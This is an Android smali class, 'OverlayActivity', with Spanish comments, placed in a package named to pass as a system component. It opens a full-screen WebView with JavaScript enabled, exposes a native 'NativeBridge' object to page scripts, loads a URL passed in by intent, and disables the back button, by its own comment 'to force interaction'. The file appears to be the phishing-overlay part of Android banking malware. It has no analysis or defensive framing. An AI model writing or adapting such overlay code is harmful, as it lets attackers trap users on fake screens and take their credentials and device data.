.class public Lcom/system/android/ui/OverlayActivity;
.super Landroid/app/Activity;

.field private webView:Landroid/webkit/WebView;

.method public constructor <init>()V
    .locals 0
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V
    return-void
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .locals 4

    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    # Configuración de ventana (Overlay)
    invoke-virtual {p0}, Lcom/system/android/ui/OverlayActivity;->getWindow()Landroid/view/Window;
    move-result-object p1
    const/16 v0, 0x400
    invoke-virtual {p1, v0, v0}, Landroid/view/Window;->setFlags(II)V

    # Crear WebView
    new-instance p1, Landroid/webkit/WebView;
    invoke-direct {p1, p0}, Landroid/webkit/WebView;-><init>(Landroid/content/Context;)V
    iput-object p1, p0, Lcom/system/android/ui/OverlayActivity;->webView:Landroid/webkit/WebView;

    # Habilitar JS
    invoke-virtual {p1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;
    move-result-object p1
    const/4 v0, 0x1
    invoke-virtual {p1, v0}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V
    invoke-virtual {p1, v0}, Landroid/webkit/WebSettings;->setDomStorageEnabled(Z)V

    # Añadir Interface JS
    iget-object p1, p0, Lcom/system/android/ui/OverlayActivity;->webView:Landroid/webkit/WebView;
    new-instance v0, Lcom/system/android/ui/NativeBridgeInterface;
    invoke-direct {v0, p0}, Lcom/system/android/ui/NativeBridgeInterface;-><init>(Landroid/content/Context;)V
    const-string v1, "NativeBridge"
    invoke-virtual {p1, v0, v1}, Landroid/webkit/WebView;->addJavascriptInterface(Ljava/lang/Object;Ljava/lang/String;)V

    # Cargar URL desde Intent
    invoke-virtual {p0}, Lcom/system/android/ui/OverlayActivity;->getIntent()Landroid/content/Intent;
    move-result-object p1
    const-string v0, "url"
    invoke-virtual {p1, v0}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;
    move-result-object p1

    if-eqz p1, :cond_exit
    iget-object v0, p0, Lcom/system/android/ui/OverlayActivity;->webView:Landroid/webkit/WebView;
    invoke-virtual {v0, p1}, Landroid/webkit/WebView;->loadUrl(Ljava/lang/String;)V

    :cond_exit
    iget-object p1, p0, Lcom/system/android/ui/OverlayActivity;->webView:Landroid/webkit/WebView;
    invoke-virtual {p0, p1}, Lcom/system/android/ui/OverlayActivity;->setContentView(Landroid/view/View;)V
    return-void
.end method

.method public onBackPressed()V
    .locals 0
    # Deshabilitar botón atrás para forzar interacción
    return-void
.end method
